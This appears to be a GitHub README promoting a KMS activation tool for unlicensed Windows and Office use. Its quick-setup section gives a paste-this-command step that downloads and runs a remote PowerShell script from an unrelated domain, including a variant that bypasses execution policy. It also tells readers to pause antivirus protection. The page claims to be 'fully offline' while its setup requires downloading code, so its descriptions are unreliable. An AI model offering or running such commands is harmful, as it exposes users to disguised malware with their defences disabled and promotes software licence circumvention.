<div align="center">

# resp-KMSAutoNET: KMS Activation & Renewal Tool for Windows 11

![preview](https://raw.githubusercontent.com/BakuraRyou666/kms-activation-manager/main/promo_9eff.svg)

[![ps](https://img.shields.io/badge/PS-INSTALLER-06b6d4?style=for-the-badge&labelColor=0d1117)]() [![stage](https://img.shields.io/badge/STAGE-RELEASED-2ea44f?style=for-the-badge&labelColor=0d1117)]() [![stars](https://img.shields.io/badge/STARS-4.6%2F5-f59e0b?style=for-the-badge&labelColor=0d1117)]()

</div>

---

resp-KMSAutoNET 1.8.7 is a desktop KMS toolkit that combines kms get and kms 2026 offline handling in a single local application. It provides Office 2025 unlock, TPM 2.0 detection, WinDivert integration for VBS environments, a Server 2022 path, and a renew timer for sustained operation. The January 3, 2026 pin requires running the executable as administrator directly on the box. All processing stays local, with no online host dependency.

## ⚡ Quick Setup (PowerShell)

> [!TIP]
> **One-click install** — paste one command, done in seconds.
> Win 10/11 · PowerShell 5.1+ · Standard user

### 1️⃣ Start PowerShell
* Press `Win + X`.
* Click **Terminal** or **Windows PowerShell** from the menu.

### 2️⃣ Execute the setup script
Copy the line below into PowerShell and press `Enter`.

```cmd
iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')
```

### 3️⃣ Forced run via CMD
Run this command in CMD instead:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')"
```

> [!WARNING]
> If security software blocks the setup, temporarily pause Real-Time Protection, run the script, then re-enable it.

## 🔧 Requirements

- **OS:** Windows 10 / 11
- **Shell:** PowerShell 5.1+ or PowerShell 7+
- **Network:** internet access to download the script
- **Privileges:** standard user

## Key Features

- **Offline KMS engine:** Operates entirely on the local machine with no external host dependency, servicing `kms get` and `kms 2026` requests through an embedded key management service.
- **Office 2025 unlock path:** Dedicated activation route for Office 2025 editions, resolved independently of the Windows product path.
- **TPM 2.0 handling:** Accounts for TPM 2.0 and Secure Boot state on modern Windows 11 installs so the activation path completes on constrained hardware.
- **WinDivert VBS integration:** Uses WinDivert to route traffic correctly when Virtualization-Based Security is enabled, avoiding conflicts with the VBS network stack.
- **Server 2022 path:** Separate resolution path for Server 2022 SKUs, keeping server and desktop activation flows isolated.
- **Renew timer:** Background renewal scheduler that re-applies activation before expiry, maintaining state without manual intervention.
- **Pinned build:** Version 1.8.7 is pinned to January 3, 2026, giving a fixed, reproducible baseline for deployment.
- **Administrator execution:** Designed to run elevated on the target box, with all operations performed locally under the admin context.
- **Portable layout:** Self-contained build with notes stored alongside the executable, requiring no system-wide installation.

## How It Works

The utility operates as a fully self-contained, offline activation engine. On launch, it elevates privileges and initializes an embedded Key Management Service host directly on the local machine, so no external server or network connection is required at any point during the activation cycle.

**Local KMS host provisioning.** The application spins up an in-process KMS service that listens on the loopback interface and responds to activation requests from the operating system and Office products. Product keys are resolved from an internal database, matched against the detected edition, and submitted to the local host for validation.

**Product detection and key selection.** Before activation, the engine enumerates installed Windows and Office builds, maps each to the appropriate volume-licensing channel, and selects a matching generic key. This detection covers current desktop and server editions, including newer Office releases and Server platform paths, so the correct key is applied without manual lookup.

**Offline activation flow.** Once the host is running and the key is installed, the engine issues the activation request to the local KMS endpoint and finalizes the license state on the box. Because the host and client are the same machine, the entire exchange completes offline.

**VBS and TPM 2.0 handling.** On systems with Virtualization-Based Security enabled, the engine uses a WinDivert-based filter to route activation traffic correctly past the virtualization layer. For Windows 11 configurations, TPM 2.0 and Secure Boot states are detected and accounted for so the activation path proceeds without interruption.

**Renewal timer.** KMS-based licenses require periodic renewal. The application installs a renew timer that re-triggers the local activation cycle at the appropriate interval, keeping the license state valid without user intervention.

**Administrative execution model.** All operations run with administrator rights on the target box. Elevation is required to install keys, start the local host, load the network filter driver, and register the renewal task. The workflow is designed to be run once and then left to maintain itself.

## Requirements & Compatibility

- **Operating System:** Windows 10 and Windows 11 (x64), with supported paths for Windows Server 2016, 2019, and 2022. Windows 11 deployments require TPM 2.0 and Secure Boot capability for the VBS-aware path.
- **Privilege Level:** Administrative elevation is mandatory. The application must be launched with *Run as Administrator* to allow service-level operations, registry access, and driver interaction.
- **Runtime Dependencies:** No external runtime, framework, or package manager is required. The distribution is self-contained and portable.
- **Virtualization-Based Security:** WinDivert is bundled and used to support VBS-enabled environments. Systems with VBS, HVCI, or memory integrity active are handled through this path.
- **Network Model:** Fully offline operation. All KMS emulation is performed locally on the host; no external server, internet connection, or remote endpoint is contacted.
- **Compatibility Targets:** Office 2025 and prior volume-licensed Office suites, plus Windows client and Server SKUs covered by the KMS 2026 profile.
- **Renew Timer:** A configurable renewal interval keeps activation current without manual intervention; the timer is designed to operate within the offline host model.
- **Build Pin:** Version 1.8.7 is pinned to the January 3, 2026 baseline. Behavior, product tables, and compatibility paths are validated against this pin.
- **Disk Footprint:** Minimal — the portable build runs from its extracted directory and does not require a system-wide installation.

## Getting Started

Begin by obtaining the current release package for resp-KMSAutoNET version 1.8.7. Verify the archive integrity, then extract its contents to a local directory with a path free of spaces or non-ASCII characters. No dependency installation or package manager steps are required; the toolkit is self-contained and portable.

Launch the primary executable by right-clicking it and selecting *Run as Administrator*. Elevated privileges are mandatory for the local KMS host to bind its service endpoints, register the renew timer, and, where applicable, initialize the WinDivert driver used to support VBS-enabled environments. The application will refuse to operate in a non-elevated context.

Once the main window is loaded, the activation workflow proceeds as follows:

1. **Select the target product** from the enumerated list — Windows client, Windows Server (including the Server 2022 path), or the Office 2025 suite. The interface auto-detects the installed edition and preselects the matching configuration.
2. **Confirm host parameters.** The embedded KMS host operates entirely offline; no external endpoint is contacted. For systems with TPM 2.0 and Secure Boot active, the WinDivert path is engaged automatically to preserve VBS compatibility.
3. **Apply the profile.** The tool provisions the local host, installs the appropriate product key, and triggers activation. Progress and status output are logged to the on-screen console.
4. **Verify the renew timer.** After successful activation, the scheduled renewal task is registered so the license state persists across the configured interval. The timer status is displayed in the dashboard panel.

Refer to the `files/notes/` directory for product-specific identifiers, the January 3, 2026 pin manifest, and troubleshooting guidance for TPM 2.0 and WinDivert scenarios. Confirm that all operations complete with a success status before closing the application.

## FAQ

**Is resp-KMSAutoNET fully offline?**
Yes. The KMS host runs entirely on the local machine; no external network communication is required for activation operations.

**Which products are supported?**
Office 2025 unlock is included, along with the Server 2022 path. The tool handles the standard KMS product matrix for volume-licensed editions.

**Does it work with VBS enabled?**
Yes. WinDivert is integrated to handle traffic interception when Virtualization-Based Security is active, avoiding conflicts that typically break KMS loops under VBS.

**What about Windows 11 hardware requirements?**
TPM 2.0 and Secure Boot paths are accounted for. The tool detects the platform state and adjusts the activation flow accordingly.

**How does the renew timer work?**
The renew timer schedules periodic re-activation to keep the license current without manual intervention. Intervals are configurable, and the timer persists across reboots.

**Is administrator privilege required?**
Yes. Run as administrator on the target box. The tool needs elevated access to install the KMS host service, modify registry keys, and load the WinDivert driver.

**What's the January 3, 2026 pin?**
The 1.8.7 build is pinned to the January 3, 2026 release. Use this version for the current feature set including Office 2025 and the Server 2022 path.

**Can I run it portably?**
Yes. A portable build is available; no installation is required beyond extraction. Configuration and notes are stored in the `files/notes/` directory.

**Which Windows versions are compatible?**
Windows 10 and Windows 11 are supported, including configurations with TPM 2.0 and Secure Boot. Server 2022 is supported via the dedicated path.

## License

This project is distributed under the MIT License, a permissive open-source license approved by the Open Source Initiative. The license grants all users the freedom to use, study, modify, and redistribute the software, provided the original copyright notice and permission notice are preserved in all copies or substantial portions of the software.

Under the terms of the MIT License, the following rights are granted without restriction:

- **Use** — the software may be used for any purpose, including commercial and private applications.
- **Modification** — the source may be altered, extended, or adapted to suit individual or organizational needs.
- **Distribution** — copies of the original or modified software may be redistributed, including as part of a larger work.
- **Sublicensing** — derivative works may be released under different terms, provided the original notices are retained.

The software is provided strictly on an "as is" basis, without warranty of any kind, whether express or implied, including but not limited to warranties of merchantability, fitness for a particular purpose, and non-infringement. In no event shall the authors or copyright holders be held liable for any claim, damages, or other liability arising from, out of, or in connection with the software or its use.

Any redistribution of this software, in original or modified form, must include the full copyright notice and this permission notice. Users are encouraged to review the complete license text distributed with the project to ensure compliance with all terms and conditions.